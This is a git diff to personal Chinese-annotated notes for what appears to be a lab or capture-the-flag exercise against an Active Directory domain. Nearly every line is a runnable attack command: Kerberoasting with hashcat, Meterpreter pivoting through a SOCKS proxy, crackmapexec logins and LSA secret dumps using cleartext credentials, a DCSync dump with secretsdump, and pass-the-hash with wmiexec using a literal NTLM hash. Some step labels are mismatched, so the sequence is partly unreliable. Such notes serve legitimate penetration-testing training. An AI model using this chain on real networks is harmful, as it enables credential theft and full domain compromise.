@@ -20,13 +20,29 @@ C:\> cGet-DomainUser * -SPN | select samaccountname      查找 SPN 账户
 C:\> cGet-DomainUser -identity svc_sql | get-domainspnticket -format hashcat      用 svc_sql 账户，获得票据
 echo ' <票据> '| tr -d "[:space:]"  > tgs_file      清楚空格和换行
 hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt      本地破解哈希
+meterpreter >  ipconfig      查看可能网段如 172.16.6.0/24
 meterpreter > run autoroute -s 172.16.6.0/24      在 Meterpreter 会话添加路由，让攻击机通过跳板机，访问目标内网 172.16.6.0/24 网段
 bg      后台当前session
-use auxiliary/scanner/portscan/tcp
+use auxiliary/scanner/portscan/tcp      设置 SOCKS 代理
 set rhosts 172.16.6.0/24
-set PORTS 139,445
-set threads 50
+set PORTS 139,445      扫描 139 和 445 端口，they are common Windows ports and can have implications for remote code execution
+set threads 50        50 个线程同时扫描
+set VERSION 5        默认使用 SOCKS5
+set SRVPORT 1080     默认使用 1080
 run
-
+sudo nano /etc/proxychains.conf      告诉系统上的其他工具（nmap、curl、浏览器等）通过这个代理访问内网
+添加  socks5          127.0.0.1 1080
+sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7      通过代理验证登录目标
+sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"      读取flag
+proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa      通过 Socks ，用 crackmapexec 对 172.16.6.50 进行 SMB 枚举，尝试用 svc_sql / lucky7 凭据通过 SMB 登录，执行 --lsa 模块，转储 LSA 凭据
+C:\> $sid = Convert-NameToSid tpetty
+C:\> Get-ObjectAcl "DC=inlanefreight,DC=local"      获取域根的 ACL
+      -ResolveGUIDs |                               把 GUID 转换成可读权限名
+     ? { ($_.ObjectAceType -match 'Replication-Get')} |       过滤出 DCSync 相关权限
+     ?{$_.SecurityIdentifier -match $sid} |                    只显示 $sid 对应的用户
+     select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl      以列表格式显示
+proxychains sudo secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator      DCSync 攻击
+proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0      通过 Pth 以 admin 验证登录 
+C:\>type c:\users\administrator\desktop\flag.txt      读取flag
 
 
